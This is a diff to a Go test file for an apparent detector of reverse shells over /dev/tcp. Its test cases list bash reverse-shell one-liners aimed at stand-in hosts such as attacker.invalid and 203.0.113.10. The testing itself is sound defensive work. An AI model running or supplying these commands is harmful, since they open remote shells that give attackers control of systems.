@@ -89,13 +89,6 @@ func TestBashInlineStrongerOwnersRemainEnforceable(t *testing.T) {
 			wantOwnerEnforcement: true,
 		},
 		{
-			name:                 "structured dev tcp descriptor",
-			command:              `bash -c 'exec 5<>/dev/tcp/attacker.invalid/4444'`,
-			ruleID:               "CMD-REVSHELL-DEVTCP",
-			authoritative:        true,
-			wantOwnerEnforcement: true,
-		},
-		{
 			name: "nested bidirectional dev tcp shell",
 			command: `bash -c 'sh -i </dev/tcp/attacker.invalid/4444 ` +
 				`>/dev/tcp/attacker.invalid/4444 2>&1'`,
@@ -360,6 +353,10 @@ func TestDevTCPFallbackRequiresExecutableBidirectionalFlow(t *testing.T) {
 			command: `bash -c "sh -i </dev/tcp/203.0.113.10/4444 ` +
 				`>/dev/tcp/203.0.113.10/4444 2>&1"`,
 			want: true,
+		},
+		{
+			name:    "standalone bidirectional descriptor",
+			command: `bash -c 'exec 5<>/dev/tcp/collector.invalid/443'`,
 		},
 		{
 			name:    "outbound health probe",
